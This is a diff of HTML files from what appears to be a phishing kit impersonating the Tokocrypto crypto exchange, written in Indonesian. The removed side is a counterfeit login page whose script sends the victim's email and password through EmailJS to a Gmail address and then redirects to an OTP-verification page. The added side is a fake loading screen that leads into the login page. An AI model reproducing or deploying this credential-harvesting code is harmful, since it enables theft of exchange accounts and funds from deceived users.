@@ -3,238 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Tokocrypto</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>Loading - Tokocrypto</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #1a1f1c 0%, #2a2f2c 100%);
+            background: url('https://i.imghippo.com/files/Coh5457Edc.jpg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Inter', 'Arial', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .error-message {
-            display: none;
-            background-color: #fee2e2;
-            color: #dc2626;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 16px;
-            border-left: 4px solid #dc2626;
+        
+        .loading-container {
+            margin-top: 100px;
+            text-align: center;
+            background: white); /* Lebih transparan lagi */
+            padding: 100px;
+            border-radius: 10px;
+            /* backdrop-filter: blur(5px); DIHAPUS */ 
+            border: 0px solid none;
+            box-shadow: 0 8px 32px none;
+            max-width: 400px;
+            width: 90%;
         }
-        .success-message {
-            display: none;
-            background-color: #d1fae5;
-            color: #065f46;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 16px;
-            border-left: 4px solid #065f46;
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
+        
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        
+        h1 {
+            color: #10b981;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
         .loading-spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #10b981;
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            animation: spin 1s linear infinite;
         }
+        
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            color: #ffffff;
+            font-size: 0.9rem;
+            margin-top: 15px;
+            font-weight: 300;
+        }
+        
+        .progress-text {
+            color: #10b981;
+            font-size: 0.8rem;
+            margin-top: 10px;
+            font-weight: 500;
         }
     </style>
 </head>
-<body class="min-h-screen flex justify-center items-start pt-10 px-4">
-    <div class="w-full max-w-md">
-        <div class="flex justify-end mb-6">
-            <button aria-label="Close" class="text-white text-2xl font-bold leading-none hover:text-green-400 transition-colors">
-                ×
-            </button>
-        </div>
-        <h1 class="text-white text-3xl font-extrabold mb-6">Masuk</h1>
-        
-        <div id="errorMessage" class="error-message">
-            <i class="fas fa-exclamation-circle mr-2"></i>
-            <span id="errorText">Terjadi kesalahan saat mengirim data.</span>
+<body>
+    <div class="loading-container">
+        <div class="logo">
+            <!-- Logo Tokocrypto Style -->
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#10b981" stroke-width="2" fill="#10b981"/>
+                <path d="M2 17L12 22L22 17" stroke="#10b981" stroke-width="2"/>
+                <path d="M2 12L12 17L22 12" stroke="#10b981" stroke-width="2"/>
+            </svg>
         </div>
         
-        <div id="successMessage" class="success-message">
-            <i class="fas fa-check-circle mr-2"></i>
-            <span>Login berhasil! Mengarahkan ke halaman OTP...</span>
-        </div>
-
-        <form id="loginForm" class="space-y-6 mt-4">
-            <div>
-                <label class="block text-white font-semibold mb-1" for="email">
-                    E-mail
-                </label>
-                <input autocomplete="email" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 focus:outline-none focus:ring-2 focus:ring-green-500" id="email" placeholder="Mohon masukkan alamat email anda" required type="email"/>
-                <p class="text-red-400 text-sm mt-1 hidden" id="emailError">Format email tidak valid</p>
-            </div>
-            <div>
-                <label class="block text-white font-semibold mb-1" for="password">
-                    Kata sandi
-                </label>
-                <div class="relative">
-                    <input autocomplete="current-password" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 pr-10 focus:outline-none focus:ring-2 focus:ring-green-500" id="password" placeholder="Silahkan masukkan kata sandi" required type="password"/>
-                    <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-[#d1d1d1] hover:text-green-400" type="button" id="togglePassword">
-                        <i class="fas fa-eye-slash"></i>
-                    </button>
-                </div>
-                <p class="text-red-400 text-sm mt-1 hidden" id="passwordError">Kata sandi harus diisi</p>
-            </div>
-            <div>
-                <a class="text-green-400 font-semibold text-sm hover:underline" href="#">
-                    Lupa kata sandi?
-                </a>
-            </div>
-            <button id="submitBtn" class="w-full bg-green-600 text-white font-semibold py-3 rounded-lg mt-4 opacity-50 cursor-not-allowed flex items-center justify-center" type="submit" disabled>
-                <span id="btnText">Lanjut</span>
-                <div id="loadingSpinner" class="loading-spinner ml-2"></div>
-            </button>
-        </form>
+        <h1></h1>
         
-        <div class="flex items-center my-6 text-gray-400 text-sm">
-            <hr class="flex-grow border-gray-600"/>
-            <span class="mx-3">atau</span>
-            <hr class="flex-grow border-gray-600"/>
-        </div>
+        <div class="loading-spinner"></div>
         
-        <div class="space-y-4">
-            <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700 transition-colors" type="button">
-                <img alt="Binance logo, yellow diamond shape" class="w-5 h-5" height="20" loading="lazy" src="https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" width="20"/>
-                Lanjutkan dengan Binance
-            </button>
-            <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700 transition-colors" type="button">
-                <img alt="Google logo, multicolor G letter" class="w-5 h-5" height="20" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" width="20"/>
-                Lanjutkan dengan Google
-            </button>
-        </div>
-        
-        <p class="mt-6 text-white text-center text-sm">
-            Belum punya akun Tokocrypto?
-            <a class="text-green-400 font-semibold hover:underline" href="#">
-                Mendaftar
-            </a>
-        </p>
+        <div class="status" id="statusText">Memuat sistem...</div>
+        <div class="progress-text" id="progressText">0%</div>
     </div>
 
     <script>
-    emailjs.init("ZV88Q0QnFIR6RvRPh");
-    
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordInput = document.getElementById('password');
-    togglePassword.addEventListener('click', () => {
-        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-        passwordInput.setAttribute('type', type);
-        togglePassword.innerHTML = type === 'password' 
-            ? '<i class="fas fa-eye-slash"></i>' 
-            : '<i class="fas fa-eye"></i>';
-    });
-
-    const emailInput = document.getElementById('email');
-    const submitBtn = document.getElementById('submitBtn');
-    const emailError = document.getElementById('emailError');
-    const passwordError = document.getElementById('passwordError');
-    const errorMessage = document.getElementById('errorMessage');
-    const errorText = document.getElementById('errorText');
-    const successMessage = document.getElementById('successMessage');
-    const btnText = document.getElementById('btnText');
-    const loadingSpinner = document.getElementById('loadingSpinner');
-
-    function validateEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
-    }
-
-    function checkInputs() {
-        const emailValid = validateEmail(emailInput.value.trim());
-        const passwordValid = passwordInput.value.trim() !== '';
+        // Simulasi proses loading
+        const statusText = document.getElementById('statusText');
+        const progressText = document.getElementById('progressText');
         
-        if (emailInput.value.trim() !== '' && !emailValid) {
-            emailError.classList.remove('hidden');
-        } else {
-            emailError.classList.add('hidden');
-        }
+        const messages = [
+            "Memuat sistem...",
+            "Menginisialisasi...", 
+            "Menyiapkan antarmuka...",
+            "Hampir selesai..."
+        ];
         
-        if (passwordInput.value.trim() === '') {
-            passwordError.classList.remove('hidden');
-        } else {
-            passwordError.classList.add('hidden');
-        }
+        let progress = 0;
+        let currentMessage = 0;
         
-        if (emailValid && passwordValid) {
-            submitBtn.disabled = false;
-            submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-            submitBtn.classList.add('hover:bg-green-700');
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
-            submitBtn.classList.remove('hover:bg-green-700');
-        }
-        
-        if (emailInput.value.trim() !== '' || passwordInput.value.trim() !== '') {
-            errorMessage.style.display = 'none';
-        }
-    }
-
-    emailInput.addEventListener('input', checkInputs);
-    passwordInput.addEventListener('input', checkInputs);
-
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const email = emailInput.value;
-        const password = passwordInput.value;
-
-        if (!validateEmail(email) || password.trim() === '') {
-            errorText.textContent = 'Harap isi email dan password dengan format yang benar';
-            errorMessage.style.display = 'flex';
-            return;
-        }
-
-        submitBtn.disabled = true;
-        btnText.textContent = 'Memproses...';
-        loadingSpinner.style.display = 'block';
-
-        try {
-           const response = await emailjs.send("service_38cere3", "template_iknm5vq", {
-                email: email,
-                password: password,
-                date: new Date().toLocaleString('id-ID'),
-                to_email: "akunbarudaftar07@gmail.com"
-            });
-
-            if (response.status === 200) {
-                localStorage.setItem('userEmail', email);
-                
-                successMessage.style.display = 'flex';
-                
-                setTimeout(() => {
-                    window.location.href = "verifikasi-otp.html";
-                }, 2000);
-            } else {
-                throw new Error('Gagal mengirim email');
+        function updateLoading() {
+            progress += Math.random() * 8;
+            if (progress > 100) progress = 100;
+            
+            progressText.textContent = Math.round(progress) + "%";
+            
+            // Ganti pesan berdasarkan progress
+            if (progress >= 25 && currentMessage === 0) {
+                statusText.textContent = messages[1];
+                currentMessage = 1;
+            } else if (progress >= 50 && currentMessage === 1) {
+                statusText.textContent = messages[2];
+                currentMessage = 2;
+            } else if (progress >= 75 && currentMessage === 2) {
+                statusText.textContent = messages[3];
+                currentMessage = 3;
             }
-        } catch (error) {
-            console.error('Error:', error);
             
-            errorText.textContent = 'Terjadi kesalahan saat mengirim data. Silakan coba lagi.';
-            errorMessage.style.display = 'flex';
-            
-            submitBtn.disabled = false;
-            btnText.textContent = 'Lanjut';
-            loadingSpinner.style.display = 'none';
+            if (progress < 100) {
+                setTimeout(updateLoading, 300);
+            } else {
+                // Redirect ke halaman login ketika loading selesai
+                setTimeout(() => {
+                    window.location.href = "login.html";
+                }, 800);
+            }
         }
-    });
-
-    emailInput.addEventListener('focus', () => {
-        errorMessage.style.display = 'none';
-    });
-    
-    passwordInput.addEventListener('focus', () => {
-        errorMessage.style.display = 'none';
-    });
-</script>
+        
+        // Mulai loading ketika halaman dimuat
+        window.addEventListener('load', updateLoading);
+    </script>
 </body>
 </html>
